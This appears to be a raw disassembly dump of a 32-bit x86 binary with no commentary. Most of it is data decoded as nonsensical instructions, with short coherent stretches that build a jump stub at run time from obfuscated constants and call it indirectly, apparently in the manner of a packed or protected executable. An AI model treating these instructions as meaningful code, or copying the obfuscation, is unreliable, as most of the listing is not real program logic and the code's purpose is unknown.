  41006a:	mov    ebx,DWORD PTR [esi+edi*4]
  41006d:	nop
  41006e:	push   edx
  41006f:	cwde   
  410070:	outs   dx,BYTE PTR ds:[esi]
  410071:	push   cs
  410072:	jnp    0x41004c
  410074:	ins    BYTE PTR es:[edi],dx
  410075:	pop    ss
  410076:	xchg   esp,eax
  410077:	jmp    0xc7ad288a
  41007c:	mov    ebp,0xf3694acc
  410081:	cwde   
  410082:	cmp    ecx,DWORD PTR [ecx+0x3c]
  410085:	retf   
  410086:	pop    ecx
  410087:	sbb    eax,0x21175c95
  41008c:	lahf   
  41008d:	sbb    ebx,esi
  41008f:	jle    0x4100ac
  410091:	and    al,BYTE PTR [edi+0x6962495f]
  410097:	mov    cl,0x3c
  410099:	sbb    BYTE PTR [ebp+0x71],0xd4
  41009d:	ret    0x72cf
  4100a0:	outs   dx,BYTE PTR ds:[esi]
  4100a1:	and    BYTE PTR [ebp+ebx*1-0x1a3b427e],cl
  4100a8:	pushf  
  4100a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100aa:	mov    ebp,0x65a7bdfc
  4100af:	mov    dl,0x9c
  4100b1:	mov    ecx,0xffe96ca5
  4100b6:	push   ss
  4100b7:	jecxz  0x4100e4
  4100b9:	jae    0x4100fc
  4100bb:	dec    ecx
  4100bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100bd:	les    eax,FWORD PTR [esi-0x1728370d]
  4100c3:	sub    BYTE PTR [ebp-0x32ce2abd],0x43
  4100ca:	into   
  4100cb:	call   0xf7445307
  4100d0:	arpl   WORD PTR [eax-0x3d],sp
  4100d3:	test   DWORD PTR [edi],edx
  4100d5:	fmul   QWORD PTR [ebp+0x16]
  4100d8:	enter  0xcaaa,0x6f
  4100dc:	sbb    al,BYTE PTR [ebp-0x54]
  4100df:	sahf   
  4100e0:	add    al,0x86
  4100e2:	mov    esi,0x15807b13
  4100e7:	pand   mm0,QWORD PTR [ebp-0x8]
  4100eb:	retf   0x333c
  4100ee:	popf   
  4100ef:	imul   BYTE PTR [edx-0x566c0aea]
  4100f5:	mov    bl,0xf4
  4100f7:	(bad)  
  4100f8:	mov    cl,0x2d
  4100fa:	pop    edx
  4100fb:	in     al,dx
  4100fc:	inc    edx
  4100fd:	in     eax,0xb7
  4100ff:	sub    ch,BYTE PTR [esi]
  410101:	pop    esi
  410102:	xchg   ecx,eax
  410103:	test   BYTE PTR [esi-0x7f0930e7],0xa7
  41010a:	sub    BYTE PTR [edi-0x4c],bl
  41010d:	not    BYTE PTR [eax+0x5b]
  410110:	and    al,BYTE PTR [edi]
  410112:	inc    edx
  410113:	jle    0x4100ac
  410115:	jmp    0x4b64:0x27c5d691
  41011c:	fsub   st,st(1)
  41011e:	cmp    esi,DWORD PTR [eax+0x41]
  410121:	mov    al,0x98
  410123:	add    BYTE PTR [ebx-0x14],dl
  410126:	pop    ebx
  410127:	sbb    edi,esi
  410129:	mov    ds:0x5006a458,al
  41012e:	adc    ebp,esi
  410130:	stc    
  410131:	pop    esp
  410132:	aaa    
  410133:	mov    ecx,0x2c864851
  410138:	mov    cl,0x1d
  41013a:	add    eax,0xd21114ac
  41013f:	scas   eax,DWORD PTR es:[edi]
  410140:	sub    esi,edi
  410142:	test   BYTE PTR [esp+ebp*1-0x71],bl
  410146:	add    esp,DWORD PTR [ebx-0x60]
  410149:	out    0xb8,eax
  41014b:	mov    WORD PTR [ecx-0x26],gs
  41014e:	pop    ebp
  41014f:	inc    eax
  410150:	mov    eax,ds:0x3ef1d4c2
  410155:	repz shr cx,0xd4
  41015a:	into   
  41015b:	(bad)  
  41015c:	and    esp,DWORD PTR [esi]
  41015e:	and    BYTE PTR [ebx+0x67],bl
  410161:	mov    edi,0xd2aa0bc8
  410166:	sub    eax,0x19a1e548
  41016b:	add    al,0xf9
  41016d:	rol    dl,cl
  41016f:	mov    al,0x22
  410171:	sti    
  410172:	jnp    0x4101a3
  410174:	mov    ah,0x12
  410176:	jg     0x41015d
  410178:	cmp    ecx,edx
  41017a:	lds    esi,FWORD PTR [ebx+0x312d2f4d]
  410180:	pop    es
  410181:	shr    DWORD PTR [edi+ecx*1-0x27d45a70],0xc8
  410189:	or     DWORD PTR [edi-0x6b4658a3],ebx
  41018f:	adc    eax,0xb8e33938
  410194:	adc    BYTE PTR [ecx+0x47dad5cb],ch
  41019a:	test   al,0xc7
  41019c:	das    
  41019d:	(bad)  
  41019e:	mov    ch,BYTE PTR [edx+ebx*1]
  4101a1:	sahf   
  4101a2:	or     BYTE PTR [eax+eax*8],al
  4101a5:	cwde   
  4101a6:	push   edi
  4101a7:	fiadd  WORD PTR [eax+0x7a]
  4101aa:	test   DWORD PTR [esi+0x466fcdbd],ebx
  4101b0:	xchg   edi,eax
  4101b1:	leave  
  4101b2:	pop    ebx
  4101b3:	mov    eax,ds:0x95bbe9b
  4101b8:	clc    
  4101b9:	repnz add esi,DWORD PTR [edx]
  4101bc:	xchg   esi,eax
  4101bd:	(bad)  
  4101be:	xor    esp,DWORD PTR [ecx]
  4101c0:	mov    ebp,0x3f8c3347
  4101c5:	and    eax,DWORD PTR [edi-0x34d08703]
  4101cb:	adc    eax,0x890d6d05
  4101d0:	repnz pop ecx
  4101d2:	fwait
  4101d3:	inc    esp
  4101d4:	push   DWORD PTR [edx+0x7ff38e60]
  4101da:	xlat   BYTE PTR ds:[ebx]
  4101db:	adc    eax,0x8de3cb6e
  4101e0:	mov    ds:0x21952b0f,al
  4101e5:	ins    BYTE PTR es:[edi],dx
  4101e6:	pop    eax
  4101e7:	add    al,BYTE PTR [ecx+0xbed49de]
  4101ed:	mov    bh,0xff
  4101ef:	pandn  mm5,QWORD PTR [bp+di-0x6595]
  4101f5:	lock sti 
  4101f7:	push   es
  4101f8:	push   ecx
  4101f9:	sub    al,0x15
  4101fb:	gs aad 0x1f
  4101fe:	mov    ah,0x63
  410200:	mov    ds:0x2171c25c,al
  410205:	pop    edi
  410206:	cdq    
  410207:	mov    edi,0xfbd8ad71
  41020c:	repnz inc ebx
  41020e:	mov    al,0xa4
  410210:	(bad)  
  410211:	repz lea edx,[edi+esi*4]
  410215:	popf   
  410216:	into   
  410217:	add    cl,BYTE PTR [esi-0x336b76c5]
  41021d:	mov    esi,DWORD PTR [eax-0x50]
  410220:	pop    ebx
  410221:	fisub  WORD PTR [edx+0x35850f0e]
  410227:	add    al,0x0
  410229:	add    BYTE PTR [ebx-0x2dcc77b3],cl
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422558
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422558
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422660
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422658],eax
  4102bc:	inc    DWORD PTR ds:0x422660
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	pop    esp
  41030d:	or     BYTE PTR [edi+0x1892c3bc],dl
  410313:	sbb    BYTE PTR [esi+0x70181814],bh
  410319:	sahf   
  41031a:	adc    al,0xdf
  41031c:	arpl   WORD PTR [edi+0x604b18c5],dx
  410322:	xor    DWORD PTR [ebp-0x1f0a6133],ebp
  410328:	inc    esi
  410329:	ficomp DWORD PTR [ebp+0x502b92a5]
  41032f:	arpl   WORD PTR [ebx],bx
  410331:	mov    ecx,0x691d4e41
  410336:	and    al,0xff
  410338:	(bad)  
  41033a:	ror    edi,0xb1
  41033d:	jmp    0x410347
  41033f:	adc    eax,0x58c55a45
  410344:	test   al,0xa0
  410346:	pop    esi
  410347:	adc    BYTE PTR [ebx-0x35fd3d0],ch
  41034d:	add    esi,DWORD PTR [esi-0x5791dc00]
  410353:	jb     0x410340
  410355:	xchg   edi,eax
  410356:	jmp    0x508d:0x7ff2cec4
  41035d:	pop    edx
  41035e:	add    esp,0xbb4128fc
  410364:	lods   eax,DWORD PTR ds:[esi]
  410365:	std    
  410366:	aaa    
  410367:	ds push esp
  410369:	sub    edi,esi
  41036b:	test   eax,0x55d533c4
  410370:	sbb    BYTE PTR [eax-0x16],ah
  410373:	and    al,0x91
  410375:	jb     0x41037f
  410377:	sbb    ch,dh
  410379:	cmp    cl,ch
  41037b:	pop    ss
  41037c:	scas   eax,DWORD PTR es:[edi]
  41037d:	and    ah,cl
  41037f:	pop    edx
  410380:	mov    esp,fs
  410382:	es mov edx,0x49434aef
  410388:	xchg   edi,eax
  410389:	pusha  
  41038a:	mov    eax,ds:0xcb4ec99a
  41038f:	jmp    0x8b3f:0x287c8c5a
  410396:	sub    BYTE PTR [eax+0x32100cf6],ah
  41039c:	cmp    bh,bh
  41039e:	aam    0xc2
  4103a0:	cmp    BYTE PTR [ebx],ah
  4103a2:	fild   DWORD PTR [esi]
  4103a4:	into   
  4103a5:	ja     0x4103dc
  4103a7:	or     DWORD PTR [edi+0x22730ae5],ebp
  4103ad:	nop
  4103ae:	jle    0x41042e
  4103b0:	cmp    DWORD PTR [ebp+0x49],edi
  4103b3:	test   BYTE PTR [esi+0x5],0xda
  4103b7:	fstp   DWORD PTR [ecx]
  4103b9:	mov    bh,bh
  4103bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103bc:	jmp    DWORD PTR [ebp-0x23ba9db]
  4103c2:	int    0xd3
  4103c4:	iret   
  4103c5:	retf   0xc6ef
  4103c8:	sub    esp,DWORD PTR [edx+0x69c9a243]
  4103ce:	(bad)  
  4103d0:	(bad)  
  4103d1:	popa   
  4103d2:	pop    ds
  4103d3:	push   es
  4103d4:	xchg   edx,eax
  4103d5:	fstp   DWORD PTR [edx-0x7b]
  4103d8:	adc    BYTE PTR [edi+0x64],0x2d
  4103dc:	mov    esp,0xb75109b7
  4103e1:	lahf   
  4103e2:	ret    0x15c9
  4103e5:	fcomp  DWORD PTR [ecx]
  4103e7:	dec    esi
  4103e8:	push   ebx
  4103e9:	sub    dl,BYTE PTR [ecx]
  4103eb:	push   0x34
  4103ed:	popa   
  4103ee:	mov    ebp,0xdfbacb9b
  4103f3:	jg     0x4103d8
  4103f5:	test   al,0xd3
  4103f7:	add    al,BYTE PTR [edi]
  4103f9:	jb     0x4103d0
  4103fb:	mov    WORD PTR [esi+eiz*2],es
  4103fe:	jnp    0x41046b
  410400:	xor    DWORD PTR [edi],ebp
  410402:	xchg   BYTE PTR [ebx],dh
  410404:	call   0x4bdb:0x825c5085
  41040b:	ss fdecstp 
  41040e:	cwde   
  41040f:	bound  edi,QWORD PTR [ecx-0x2027e0d8]
  410415:	and    eax,0xa80db129
  41041a:	cwde   
  41041b:	cmp    DWORD PTR [edx-0x47],0xffffffcd
  41041f:	pop    edx
  410420:	test   al,0xc8
  410422:	jg     0x41046c
  410424:	jge    0x4103ea
  410426:	sub    eax,0x9fa986d4
  41042b:	imul   ebp,DWORD PTR [ebx-0x66],0x3f
  41042f:	sbb    eax,edx
  410431:	lods   eax,DWORD PTR ds:[esi]
  410432:	jns    0x41044a
  410434:	popf   
  410435:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410437:	leave  
  410438:	mov    dh,0xaa
  41043a:	repnz arpl WORD PTR [ebx],si
  41043d:	pop    edx
  41043e:	mov    esi,0xcbec94d0
  410443:	adc    al,BYTE PTR [esi+eax*4+0x27fa4343]
  41044a:	dec    eax
  41044b:	inc    esi
  41044c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41044d:	cmp    DWORD PTR [edi-0x69900d16],eax
  410453:	sbb    ch,ch
  410455:	adc    al,BYTE PTR [edi+ebx*8]
  410458:	xchg   ebx,eax
  410459:	test   bh,bh
  41045b:	mov    ecx,0xd4bfba1d
  410460:	fnstcw WORD PTR [edi-0x3cbfa860]
  410466:	xor    DWORD PTR [ecx],esi
  410468:	pop    edi
  410469:	mov    DWORD PTR [eax+edi*1-0x47],eax
  41046d:	addr16 mov eax,0xc1240ad6
  410473:	stos   DWORD PTR es:[edi],eax
  410474:	in     eax,dx
  410475:	les    edx,FWORD PTR [edi]
  410477:	adc    DWORD PTR [esp+ebp*8],edi
  41047a:	shl    DWORD PTR [esi],cl
  41047c:	cmp    edi,DWORD PTR [edx-0x1755b97b]
  410482:	cwde   
  410483:	dec    edx
  410484:	mov    ebp,0xfec5cfe0
  410489:	fdiv   QWORD PTR [edi+0x58c6c61b]
  41048f:	(bad)  
  410491:	fisubr WORD PTR [edx+0x39]
  410494:	mov    bh,0x88
  410496:	imul   edi,esi,0x766c38c2
  41049c:	dec    cx
  41049e:	jnp    0x41043f
  4104a0:	and    eax,0x7f218508
  4104a5:	loopne 0x41046f
  4104a7:	jg     0x4104c7
  4104a9:	sub    esi,DWORD PTR [esi]
  4104ab:	jno    0x4104d2
  4104ad:	xchg   edi,eax
  4104ae:	loope  0x410436
  4104b0:	dec    ecx
  4104b1:	int3   
  4104b2:	dec    eax
  4104b3:	xchg   ebx,eax
  4104b4:	stos   BYTE PTR es:[edi],al
  4104b5:	out    0xe0,eax
  4104b7:	int    0x3d
  4104b9:	push   edi
  4104ba:	jnp    0x410483
  4104bc:	lods   al,BYTE PTR ds:[esi]
  4104bd:	pop    ss
  4104be:	sub    BYTE PTR [esi],cl
  4104c0:	or     ebp,eax
  4104c2:	cmp    BYTE PTR [eax],dh
  4104c4:	sbb    BYTE PTR [ecx+0x56],0x61
  4104c8:	mov    ebp,0x2958278
  4104cd:	in     al,dx
  4104ce:	mov    ecx,0xd6327e0d
  4104d3:	or     DWORD PTR [ebp+0x591e198d],edx
  4104d9:	sub    ecx,0x15
  4104dc:	cmp    DWORD PTR [ebx+ebp*8],edi
  4104df:	sbb    eax,0x6642ab7f
  4104e4:	test   DWORD PTR [esi-0x25],eax
  4104e7:	sbb    esi,ecx
  4104e9:	cs sub eax,0x5495cf60
  4104ef:	in     al,0x2d
  4104f1:	(bad)  
  4104f2:	and    esp,DWORD PTR [esi-0x43]
  4104f5:	(bad)  
  4104f6:	xchg   edx,eax
  4104f7:	aad    0x8c
  4104f9:	je     0x4104ed
  4104fb:	sahf   
  4104fc:	push   ebp
  4104fd:	pop    esi
  4104fe:	leave  
  4104ff:	xor    al,0x86
  410501:	mov    al,BYTE PTR ds:0x9c3f9ce6
  410507:	aad    0xb
  410509:	call   0xacaf:0x4266ea4a
  410510:	mov    ecx,DWORD PTR ds:0xbe0fdae5
  410516:	push   esi
  410517:	sub    eax,0x84d4b430
  41051c:	cld    
  41051d:	shr    DWORD PTR [edi+0x32],cl
  410520:	and    eax,0xbe45b91b
  410525:	rcr    DWORD PTR [eax-0x483f1807],0x55
  41052c:	inc    edx
  41052d:	in     eax,dx
  41052e:	mov    eax,ds:0x97231333
  410533:	out    dx,eax
  410534:	push   edx
  410535:	pop    ecx
  410536:	pop    es
  410537:	aad    0x25
  410539:	call   0xfdfa:0x255421b8
  410540:	dec    ecx
  410541:	mov    dh,0x5b
  410543:	enter  0xaa9f,0xf3
  410547:	ins    BYTE PTR es:[edi],dx
  410548:	ret    
  410549:	jl     0x4105a1
  41054b:	jecxz  0x410577
  41054d:	cmp    al,0x8e
  41054f:	push   esp
  410550:	pop    es
  410551:	jmp    0xb4089ee8
  410556:	or     al,0x6
  410558:	push   ebp
  410559:	and    DWORD PTR [ebx-0x40],esi
  41055c:	or     eax,0x1a430ce2
  410561:	loope  0x410500
  410563:	pop    esp
  410564:	out    dx,eax
  410565:	pop    esi
  410566:	xchg   edi,eax
  410567:	shl    BYTE PTR [eax+0x5a],0xf2
  41056b:	sub    al,0xdb
  41056d:	es mov ecx,0x46624afb
  410573:	ja     0x410592
  410575:	ins    BYTE PTR es:[edi],dx
  410576:	ins    BYTE PTR es:[edi],dx
  410577:	div    BYTE PTR [esp+ebx*8+0x47a4e73a]
  41057e:	inc    edi
  41057f:	inc    ecx
  410580:	outs   dx,BYTE PTR ds:[esi]
  410581:	mov    dl,0x56
  410583:	(bad)  
  410584:	aad    0xdc
  410586:	or     bh,BYTE PTR [ecx+0x1386ee]
  41058c:	inc    esp
  41058d:	xor    DWORD PTR [edx+edi*4-0x5a5910a9],ecx
  410594:	cmp    cl,BYTE PTR [edi-0x75743f27]
  41059a:	ins    DWORD PTR es:[edi],dx
  41059b:	lods   al,BYTE PTR ds:[esi]
  41059c:	aaa    
  41059d:	in     al,0xf5
  41059f:	xchg   esp,eax
  4105a0:	push   ebp
  4105a1:	dec    ebp
  4105a2:	inc    ebp
  4105a3:	daa    
  4105a4:	cmp    eax,0xf38dda4f
  4105a9:	cmp    al,al
  4105ab:	adc    edx,DWORD PTR ss:[ecx-0x1e]
  4105af:	mov    bl,0x44
  4105b1:	jl     0x410622
  4105b3:	sbb    BYTE PTR [edx-0x77],cl
  4105b6:	(bad)  
  4105b7:	enter  0xd1f,0x30
  4105bb:	or     al,0x99
  4105bd:	mov    fs,WORD PTR [esi-0x75]
  4105c0:	add    ecx,DWORD PTR ss:[edx-0x46]
  4105c4:	popf   
  4105c5:	and    eax,0x8d73b50d
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223d4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422648
  410612:	push   DWORD PTR ds:0x4223dc
  410618:	push   DWORD PTR ds:0x422628
  41061e:	push   DWORD PTR ds:0x42269c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422558
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	(bad)  
  4106ed:	push   ss
  4106ee:	ja     0x41076c
  4106f0:	push   0x9a18188e
  4106f5:	adc    al,0x18
  4106f7:	sbb    bh,al
  4106f9:	call   0xfe4e593
  4106fe:	xlat   BYTE PTR ds:[ebx]
  4106ff:	mov    bl,0xd
  410701:	sahf   
  410702:	outs   dx,BYTE PTR ds:[esi]
  410703:	ror    DWORD PTR [edx-0x15d7d20d],1
  410709:	dec    ebx
  41070a:	pop    eax
  41070b:	cmp    al,0x91
  41070d:	sbb    BYTE PTR [edx],ah
  41070f:	fs inc esi
  410711:	dec    edi
  410712:	mov    esp,0xec26d9b7
  410717:	inc    ebp
  410718:	and    eax,0x8b42b833
  41071d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41071e:	sub    ah,dl
  410720:	(bad)  
  410721:	shr    BYTE PTR [esi+ebx*1-0xb],cl
  410725:	stc    
  410726:	push   ebx
  410727:	inc    eax
  410728:	push   esi
  410729:	and    al,0x44
  41072b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41072c:	or     dh,bh
  41072e:	aas    
  41072f:	and    DWORD PTR [eax+0x7b7f1b6],ecx
  410735:	iret   
  410736:	jns    0x410703
  410738:	inc    ecx
  410739:	test   eax,0x87ddccdb
  41073e:	mov    ch,0x1
  410740:	push   0xffffffdb
  410742:	inc    ecx
  410743:	xchg   ebx,eax
  410744:	dec    ebp
  410745:	js     0x410730
  410747:	leave  
  410748:	out    dx,eax
  410749:	jb     0x41070b
  41074b:	dec    edi
  41074c:	data16 aad 0x88
  41074f:	mov    eax,0x20694ab4
  410754:	es push 0xa371021f
  41075a:	jb     0x4107a0
  41075c:	dec    edi
  41075d:	mov    bh,0x40
  41075f:	or     eax,DWORD PTR [eax+ebx*2+0x651bb2cd]
  410766:	fwait
  410767:	out    0x2,eax
  410769:	push   ds
  41076a:	leave  
  41076b:	pop    ss
  41076c:	rol    BYTE PTR [esi-0x4b833aac],cl
  410772:	inc    esp
  410773:	inc    esp
  410774:	int3   
  410775:	cld    
  410776:	mov    ?,eax
  410778:	jne    0x4107ca
  41077a:	adc    al,0x6e
  41077c:	pop    es
  41077d:	(bad)  
  41077e:	das    
  41077f:	das    
  410780:	retf   
  410781:	add    al,BYTE PTR [edi-0x3f]
  410784:	ret    
  410785:	ret    0x1587
  410788:	xchg   edx,eax
  410789:	dec    ecx
  41078a:	mov    eax,0x23221e31
  41078f:	ret    
  410790:	das    
  410791:	dec    esp
  410792:	das    
  410793:	fidivr DWORD PTR [ecx-0x6c0353dc]
  410799:	cmp    eax,0x364b2b42
  41079e:	xchg   ebx,eax
  41079f:	mov    edi,0xd37f5f78
  4107a4:	mov    ebp,0xabcfd68f
  4107a9:	scas   al,BYTE PTR es:[edi]
  4107aa:	mov    bl,0xaf
  4107ac:	sahf   
  4107ad:	mov    ch,cl
  4107af:	fadd   QWORD PTR [ebp+0x15815df4]
  4107b5:	mov    ds:0x9bb4459f,eax
  4107ba:	cdq    
  4107bb:	adc    edx,esp
  4107bd:	fs mov ah,0xfa
  4107c0:	dec    eax
  4107c1:	jmp    edi
  4107c3:	push   0x1a7e1f01
  4107c8:	dec    edi
  4107c9:	inc    ebp
  4107ca:	add    dl,ah
  4107cc:	dec    ebx
  4107cd:	sub    DWORD PTR [edi],edx
  4107cf:	pop    ds
  4107d0:	neg    BYTE PTR [esi+eiz*4+0x2bdb44bd]
  4107d7:	mov    ch,0x6e
  4107d9:	cmp    BYTE PTR [edi+eax*2],0x1a
  4107dd:	push   ds
  4107de:	cli    
  4107df:	push   0xffffffdd
  4107e1:	ror    BYTE PTR ds:0xef7ebfd2,cl
  4107e7:	jno    0x410792
  4107e9:	inc    ebx
  4107ea:	adc    DWORD PTR [eax],eax
  4107ec:	pop    ecx
  4107ed:	shl    BYTE PTR [ecx+0x6471efed],0x7e
  4107f4:	sub    ebp,DWORD PTR [ecx]
  4107f6:	push   esp
  4107f7:	mov    esp,0x3d08d8f
  4107fc:	mov    edx,0x8a048a49
  410801:	outs   dx,BYTE PTR ds:[esi]
  410802:	xchg   DWORD PTR [esi],ecx
  410804:	jl     0x4107b0
  410806:	push   eax
  410807:	out    dx,al
  410808:	rcl    esi,cl
  41080a:	cmc    
  41080b:	jnp    0x4107a0
  41080d:	xor    BYTE PTR ss:[edi+0x24834cf6],ch
  410814:	and    eax,0x2bbb62cb
  410819:	pop    ecx
  41081a:	jo     0x41088e
  41081c:	sbb    DWORD PTR [edx+eax*8+0x5c877052],ebx
  410823:	and    ch,BYTE PTR [edx-0x69]
  410826:	sbb    eax,0x290b1c86
  41082b:	xor    al,0xc3
  41082d:	sbb    eax,DWORD PTR [ebp-0x2ff94e37]
  410833:	imul   eax,edx,0xb72fa223
  410839:	cmp    eax,0xdffd45ce
  41083e:	mov    eax,0x14e742ff
  410843:	adc    dl,BYTE PTR [edi+0x14]
  410846:	dec    ebx
  410847:	js     0x4107fa
  410849:	scas   eax,DWORD PTR es:[edi]
  41084a:	mov    bh,0x7f
  41084c:	fwait
  41084d:	pop    ds
  41084e:	mov    esi,0x203a846
  410853:	in     al,0xfa
  410855:	sub    DWORD PTR [esi-0x2a315d51],eax
  41085b:	jp     0x410833
  41085d:	sub    eax,0x52f7209e
  410862:	out    0x6,eax
  410864:	xchg   ebp,eax
  410865:	(bad)  
  410866:	pop    ss
  410867:	rol    DWORD PTR [edx+edx*1],cl
  41086a:	mov    dh,0x55
  41086c:	in     eax,0x20
  41086e:	arpl   WORD PTR [edx],cx
  410870:	scas   eax,DWORD PTR es:[edi]
  410871:	fcmove st,st(2)
  410873:	sbb    eax,0xd74b28a
  410878:	xor    esi,esi
  41087a:	adc    BYTE PTR [ecx+0x29],ah
  41087d:	fdiv   DWORD PTR [edx+0x2dac3d46]
  410883:	jle    0x4108cc
  410885:	retf   0xbca2
  410888:	inc    esp
  410889:	mov    dl,0x50
  41088b:	lfs    esi,FWORD PTR [ebx+ecx*1-0x45]
  410890:	xchg   edx,eax
  410891:	fldenv [ecx+ebx*8]
  410894:	dec    ecx
  410895:	xor    cl,BYTE PTR [esi-0x57]
  410898:	push   es
  410899:	mov    eax,0x2fd4ee5f
  41089e:	fnstsw WORD PTR [esi]
  4108a0:	div    DWORD PTR gs:[eax-0x40ddedd6]
  4108a7:	mov    BYTE PTR [ecx-0x7a],dl
  4108aa:	jbe    0x410912
  4108ac:	jno    0x4108bb
  4108ae:	pop    ds
  4108af:	mov    ch,ch
  4108b1:	adc    edx,0x71aa6874
  4108b7:	xor    al,0xf5
  4108b9:	jecxz  0x4108e8
  4108bb:	repz jmp 0xe659:0x30044608
  4108c3:	jae    0x41090f
  4108c5:	xor    eax,0xabe5d6a4
  4108ca:	ret    
  4108cb:	out    dx,al
  4108cc:	or     ch,BYTE PTR [edi-0x16]
  4108cf:	adc    BYTE PTR [esi+0xba14b97],0xd6
  4108d6:	test   BYTE PTR [edi+0xbb66681],ah
  4108dc:	dec    edx
  4108dd:	div    bl
  4108df:	cmp    eax,0x70d2df52
  4108e4:	sub    edi,DWORD PTR [eax-0x5cc72cbc]
  4108ea:	xchg   BYTE PTR [ecx],bl
  4108ec:	inc    esi
  4108ed:	in     al,dx
  4108ee:	mov    es,WORD PTR [eax]
  4108f0:	jno    0x410950
  4108f2:	shl    DWORD PTR [edx],1
